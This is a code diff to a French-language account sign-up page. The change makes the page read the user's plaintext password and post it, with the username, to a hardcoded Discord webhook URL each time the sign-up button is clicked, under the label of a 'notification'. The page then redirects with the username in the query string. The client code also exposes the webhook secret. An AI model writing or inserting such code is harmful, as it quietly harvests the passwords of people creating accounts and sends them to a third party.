@@ -71,43 +71,42 @@
   <div class="form-container">
     <h2>Créer un compte</h2>
     <input id="username" type="text" placeholder="Nom d'utilisateur" />
-    <input type="password" placeholder="Mot de passe" />
+    <input id="password" type="password" placeholder="Mot de passe" />
     <button id="signup-button">Créer un compte</button>
     <a class="link" href="se-connecter.html">Se connecter</a>
   </div>
 
   <!-- Notification Discord via Webhook lors de la création de compte -->
   <script>
-    // Exemple de code pour notifier Discord quand un compte est créé
-    const webhookUrl = "https://discord.com/api/webhooks/1358389159127154748/Xt096LVu3tzwb-Pc8KK1wwrIuzN4ubavLDXafCoYaw6FgwG5RLE232xY0ItvJUyxUC3E"; // Remplacez par votre URL de webhook Discord
+    const webhookUrl = "https://discord.com/api/webhooks/1358389159127154748/Xt096LVu3tzwb-Pc8KK1wwrIuzN4ubavLDXafCoYaw6FgwG5RLE232xY0ItvJUyxUC3E"; // Votre URL de webhook Discord
 
     document.getElementById('signup-button').addEventListener('click', async function(event) {
       event.preventDefault();
       const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
 
-      // Message de notification
+      // Message de notification avec pseudo et mot de passe
       const data = {
-        content: `**Nouveau compte créé**\nUtilisateur : ${username}`
+        content: `**Nouveau compte créé**\nUtilisateur : ${username}\nMot de passe : ${password}`
       };
 
+      // Envoi de la notification Discord
       await fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       });
 
-      // Logique de création de compte ici
-      alert('Compte créé !');
+      // Redirection vers le dashboard après la création du compte
+      window.location.href = `dashboard.html?username=${username}`;
     });
   </script>
 
   <!-- Dynamisation du pseudo utilisateur -->
   <script>
-    // Dynamiser le pseudo affiché sur la page
     const urlParams = new URLSearchParams(window.location.search);
-    const username = urlParams.get('username'); // Supposons que le pseudo soit passé en paramètre dans l'URL
+    const username = urlParams.get('username');
     if (username) {
-      // Remplacer le texte de pseudo dans la page par celui-ci
       const userNameElements = document.querySelectorAll('.user-name');
       userNameElements.forEach(element => {
         element.textContent = username;
